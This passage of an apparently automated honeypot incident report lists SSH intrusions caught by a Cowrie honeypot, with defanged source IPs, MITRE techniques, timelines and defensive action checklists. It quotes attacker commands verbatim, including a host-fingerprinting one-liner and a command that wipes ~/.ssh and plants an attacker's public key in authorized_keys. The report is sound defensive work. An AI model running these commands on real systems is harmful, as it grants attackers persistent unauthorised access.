| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:46:29` | `cowrie.session.connect` |
| `2026-09-04 04:46:29` | `cowrie.client.version` |
| `2026-09-04 04:46:29` | `cowrie.client.kex` |
| `2026-09-04 04:46:30` | `cowrie.login.success` |
| `2026-09-04 04:46:31` | `cowrie.session.params` |
| `2026-09-04 04:46:31` | `cowrie.command.input` |
| `2026-09-04 04:46:31` | `cowrie.command.input` |
| `2026-09-04 04:46:31` | `cowrie.command.input` |
| `2026-09-04 04:46:31` | `cowrie.command.input` |
| `2026-09-04 04:46:31` | `cowrie.command.input` |
| `2026-09-04 04:46:31` | `cowrie.command.success` |
| `2026-09-04 04:46:31` | `cowrie.command.input` |
| `2026-09-04 04:46:31` | `cowrie.command.input` |
| `2026-09-04 04:46:31` | `cowrie.command.input` |
| `2026-09-04 04:46:31` | `cowrie.command.input` |
| `2026-09-04 04:46:31` | `cowrie.log.closed` |
| `2026-09-04 04:46:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b4de362e9cb

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 04:48 |
| **Last Seen** | 2026-09-04 04:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:48:32` | `cowrie.session.connect` |
| `2026-09-04 04:48:32` | `cowrie.client.version` |
| `2026-09-04 04:48:33` | `cowrie.client.kex` |
| `2026-09-04 04:48:33` | `cowrie.login.success` |
| `2026-09-04 04:48:34` | `cowrie.direct-tcpip.request` |
| `2026-09-04 04:48:34` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 04:48:34` | `cowrie.direct-tcpip.data` |
| `2026-09-04 04:48:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2395fd3c19c4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-04 04:48 |
| **Last Seen** | 2026-09-04 04:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:48:35` | `cowrie.session.connect` |
| `2026-09-04 04:48:35` | `cowrie.client.version` |
| `2026-09-04 04:48:35` | `cowrie.client.kex` |
| `2026-09-04 04:48:37` | `cowrie.login.success` |
| `2026-09-04 04:48:38` | `cowrie.session.params` |
| `2026-09-04 04:48:38` | `cowrie.command.input` |
| `2026-09-04 04:48:38` | `cowrie.command.input` |
| `2026-09-04 04:48:38` | `cowrie.command.input` |
| `2026-09-04 04:48:38` | `cowrie.command.input` |
| `2026-09-04 04:48:38` | `cowrie.command.input` |
| `2026-09-04 04:48:38` | `cowrie.command.success` |
| `2026-09-04 04:48:38` | `cowrie.command.input` |
| `2026-09-04 04:48:38` | `cowrie.command.input` |
| `2026-09-04 04:48:38` | `cowrie.command.input` |
| `2026-09-04 04:48:38` | `cowrie.command.input` |
| `2026-09-04 04:48:38` | `cowrie.log.closed` |
| `2026-09-04 04:48:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33f943f54c00

| Field | Detail |
|---|---|
| **Source IP** | `104.155.46[.]74` |
| **First Seen** | 2026-09-04 04:49 |
| **Last Seen** | 2026-09-04 04:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:49:34` | `cowrie.session.connect` |
| `2026-09-04 04:49:34` | `cowrie.client.version` |
| `2026-09-04 04:49:34` | `cowrie.client.kex` |
| `2026-09-04 04:49:36` | `cowrie.login.success` |
| `2026-09-04 04:49:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.155.46[.]74` to AbuseIPDB if not already reported
- [ ] Block `104.155.46[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08c0943e363c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-04 04:50 |
| **Last Seen** | 2026-09-04 04:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:50:40` | `cowrie.session.connect` |
| `2026-09-04 04:50:40` | `cowrie.client.version` |
| `2026-09-04 04:50:40` | `cowrie.client.kex` |
| `2026-09-04 04:50:42` | `cowrie.login.success` |
| `2026-09-04 04:50:44` | `cowrie.session.params` |
| `2026-09-04 04:50:44` | `cowrie.command.input` |
| `2026-09-04 04:50:44` | `cowrie.command.input` |
| `2026-09-04 04:50:44` | `cowrie.command.input` |
| `2026-09-04 04:50:44` | `cowrie.command.input` |
| `2026-09-04 04:50:44` | `cowrie.command.input` |
| `2026-09-04 04:50:44` | `cowrie.command.success` |
| `2026-09-04 04:50:44` | `cowrie.command.input` |
| `2026-09-04 04:50:44` | `cowrie.command.input` |
| `2026-09-04 04:50:44` | `cowrie.command.input` |
| `2026-09-04 04:50:44` | `cowrie.command.input` |
| `2026-09-04 04:50:45` | `cowrie.log.closed` |
| `2026-09-04 04:50:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f11172e48ef0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 04:51 |
| **Last Seen** | 2026-09-04 04:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:51:52` | `cowrie.session.connect` |
| `2026-09-04 04:51:52` | `cowrie.client.version` |
| `2026-09-04 04:51:52` | `cowrie.client.kex` |
| `2026-09-04 04:51:53` | `cowrie.login.success` |
| `2026-09-04 04:51:53` | `cowrie.direct-tcpip.request` |
| `2026-09-04 04:51:53` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 04:51:53` | `cowrie.direct-tcpip.data` |
| `2026-09-04 04:51:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3271e2336775

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-04 04:52 |
| **Last Seen** | 2026-09-04 04:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:52:49` | `cowrie.session.connect` |
| `2026-09-04 04:52:49` | `cowrie.client.version` |
| `2026-09-04 04:52:49` | `cowrie.client.kex` |
| `2026-09-04 04:52:50` | `cowrie.login.success` |
| `2026-09-04 04:52:52` | `cowrie.session.params` |
| `2026-09-04 04:52:52` | `cowrie.command.input` |
| `2026-09-04 04:52:52` | `cowrie.command.input` |
| `2026-09-04 04:52:52` | `cowrie.command.input` |
| `2026-09-04 04:52:52` | `cowrie.command.input` |
| `2026-09-04 04:52:52` | `cowrie.command.input` |
| `2026-09-04 04:52:52` | `cowrie.command.success` |
| `2026-09-04 04:52:52` | `cowrie.command.input` |
| `2026-09-04 04:52:52` | `cowrie.command.input` |
| `2026-09-04 04:52:52` | `cowrie.command.input` |
| `2026-09-04 04:52:52` | `cowrie.command.input` |
| `2026-09-04 04:52:52` | `cowrie.log.closed` |
| `2026-09-04 04:52:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e75e90e3c391

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-04 04:55 |
| **Last Seen** | 2026-09-04 04:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:55:02` | `cowrie.session.connect` |
| `2026-09-04 04:55:02` | `cowrie.client.version` |
| `2026-09-04 04:55:02` | `cowrie.client.kex` |
| `2026-09-04 04:55:04` | `cowrie.login.success` |
| `2026-09-04 04:55:05` | `cowrie.session.params` |
| `2026-09-04 04:55:05` | `cowrie.command.input` |
| `2026-09-04 04:55:06` | `cowrie.command.input` |
| `2026-09-04 04:55:06` | `cowrie.command.input` |
| `2026-09-04 04:55:06` | `cowrie.command.input` |
| `2026-09-04 04:55:06` | `cowrie.command.input` |
| `2026-09-04 04:55:06` | `cowrie.command.success` |
| `2026-09-04 04:55:06` | `cowrie.command.input` |
| `2026-09-04 04:55:06` | `cowrie.command.input` |
| `2026-09-04 04:55:06` | `cowrie.command.input` |
| `2026-09-04 04:55:06` | `cowrie.command.input` |
| `2026-09-04 04:55:06` | `cowrie.log.closed` |
| `2026-09-04 04:55:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c61c74ac0f2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-04 04:57 |
| **Last Seen** | 2026-09-04 04:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:57:12` | `cowrie.session.connect` |
| `2026-09-04 04:57:12` | `cowrie.client.version` |
| `2026-09-04 04:57:12` | `cowrie.client.kex` |
| `2026-09-04 04:57:13` | `cowrie.login.success` |
| `2026-09-04 04:57:14` | `cowrie.session.params` |
| `2026-09-04 04:57:14` | `cowrie.command.input` |
| `2026-09-04 04:57:14` | `cowrie.command.input` |
| `2026-09-04 04:57:14` | `cowrie.command.input` |
| `2026-09-04 04:57:14` | `cowrie.command.input` |
| `2026-09-04 04:57:14` | `cowrie.command.input` |
| `2026-09-04 04:57:14` | `cowrie.command.success` |
| `2026-09-04 04:57:14` | `cowrie.command.input` |
| `2026-09-04 04:57:14` | `cowrie.command.input` |
| `2026-09-04 04:57:14` | `cowrie.command.input` |
| `2026-09-04 04:57:14` | `cowrie.command.input` |
| `2026-09-04 04:57:15` | `cowrie.log.closed` |
| `2026-09-04 04:57:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b01042033c1d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-04 04:57 |
| **Last Seen** | 2026-09-04 04:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:57:56` | `cowrie.session.connect` |
| `2026-09-04 04:57:56` | `cowrie.client.version` |
| `2026-09-04 04:57:56` | `cowrie.client.kex` |
| `2026-09-04 04:57:57` | `cowrie.login.success` |
| `2026-09-04 04:57:57` | `cowrie.direct-tcpip.request` |
| `2026-09-04 04:57:57` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-04 04:57:57` | `cowrie.direct-tcpip.data` |
| `2026-09-04 04:57:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a47b7d45fd71

| Field | Detail |
|---|---|
| **Source IP** | `51.91.96[.]79` |
| **First Seen** | 2026-09-04 04:58 |
| **Last Seen** | 2026-09-04 04:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:58:00` | `cowrie.session.connect` |
| `2026-09-04 04:58:00` | `cowrie.client.version` |
| `2026-09-04 04:58:00` | `cowrie.client.kex` |
| `2026-09-04 04:58:01` | `cowrie.login.success` |
| `2026-09-04 04:58:01` | `cowrie.session.params` |
| `2026-09-04 04:58:01` | `cowrie.command.input` |
| `2026-09-04 04:58:01` | `cowrie.command.failed` |
| `2026-09-04 04:58:01` | `cowrie.log.closed` |
| `2026-09-04 04:58:02` | `cowrie.session.params` |
| `2026-09-04 04:58:02` | `cowrie.command.input` |
| `2026-09-04 04:58:02` | `cowrie.session.file_download` |
| `2026-09-04 04:58:02` | `cowrie.log.closed` |
| `2026-09-04 04:58:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.91.96[.]79` to AbuseIPDB if not already reported
- [ ] Block `51.91.96[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f9909f7b41b

| Field | Detail |
|---|---|
| **Source IP** | `51.91.96[.]79` |
| **First Seen** | 2026-09-04 04:58 |
| **Last Seen** | 2026-09-04 04:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:58:02` | `cowrie.session.connect` |
| `2026-09-04 04:58:02` | `cowrie.client.version` |
| `2026-09-04 04:58:03` | `cowrie.client.kex` |
| `2026-09-04 04:58:03` | `cowrie.login.success` |
| `2026-09-04 04:58:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.91.96[.]79` to AbuseIPDB if not already reported
- [ ] Block `51.91.96[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6adabb10fc10

| Field | Detail |
|---|---|
| **Source IP** | `51.91.96[.]79` |
| **First Seen** | 2026-09-04 04:58 |
| **Last Seen** | 2026-09-04 04:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:58:03` | `cowrie.session.connect` |
| `2026-09-04 04:58:03` | `cowrie.client.version` |
| `2026-09-04 04:58:03` | `cowrie.client.kex` |
| `2026-09-04 04:58:04` | `cowrie.login.success` |
| `2026-09-04 04:58:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.91.96[.]79` to AbuseIPDB if not already reported
- [ ] Block `51.91.96[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b95cdcb12784

| Field | Detail |
|---|---|
| **Source IP** | `129.121.33[.]174` |
| **First Seen** | 2026-09-04 04:59 |
| **Last Seen** | 2026-09-04 04:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:59:13` | `cowrie.session.connect` |
| `2026-09-04 04:59:13` | `cowrie.client.version` |
| `2026-09-04 04:59:13` | `cowrie.client.kex` |
| `2026-09-04 04:59:13` | `cowrie.login.success` |
| `2026-09-04 04:59:14` | `cowrie.session.params` |
| `2026-09-04 04:59:14` | `cowrie.command.input` |
| `2026-09-04 04:59:14` | `cowrie.command.failed` |
| `2026-09-04 04:59:14` | `cowrie.log.closed` |
| `2026-09-04 04:59:15` | `cowrie.session.params` |
| `2026-09-04 04:59:15` | `cowrie.command.input` |
| `2026-09-04 04:59:15` | `cowrie.session.file_download` |
| `2026-09-04 04:59:15` | `cowrie.log.closed` |
| `2026-09-04 04:59:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.33[.]174` to AbuseIPDB if not already reported
- [ ] Block `129.121.33[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-733b1f4417be

| Field | Detail |
|---|---|
| **Source IP** | `129.121.33[.]174` |
| **First Seen** | 2026-09-04 04:59 |
| **Last Seen** | 2026-09-04 04:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:59:15` | `cowrie.session.connect` |
| `2026-09-04 04:59:15` | `cowrie.client.version` |
| `2026-09-04 04:59:15` | `cowrie.client.kex` |
| `2026-09-04 04:59:16` | `cowrie.login.success` |
| `2026-09-04 04:59:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.33[.]174` to AbuseIPDB if not already reported
- [ ] Block `129.121.33[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6cd406d5cd74

| Field | Detail |
|---|---|
| **Source IP** | `129.121.33[.]174` |
| **First Seen** | 2026-09-04 04:59 |
| **Last Seen** | 2026-09-04 04:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:59:16` | `cowrie.session.connect` |
| `2026-09-04 04:59:16` | `cowrie.client.version` |
| `2026-09-04 04:59:16` | `cowrie.client.kex` |
| `2026-09-04 04:59:17` | `cowrie.login.success` |
| `2026-09-04 04:59:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.33[.]174` to AbuseIPDB if not already reported
- [ ] Block `129.121.33[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd22e5dc4efd

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-09-04 04:59 |
| **Last Seen** | 2026-09-04 04:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-04 04:59:39` | `cowrie.session.connect` |
| `2026-09-04 04:59:39` | `cowrie.client.version` |
| `2026-09-04 04:59:39` | `cowrie.client.kex` |
| `2026-09-04 04:59:39` | `cowrie.login.success` |
| `2026-09-04 04:59:40` | `cowrie.session.params` |
| `2026-09-04 04:59:40` | `cowrie.command.input` |
| `2026-09-04 04:59:40` | `cowrie.command.input` |
| `2026-09-04 04:59:40` | `cowrie.command.input` |
| `2026-09-04 04:59:40` | `cowrie.command.input` |
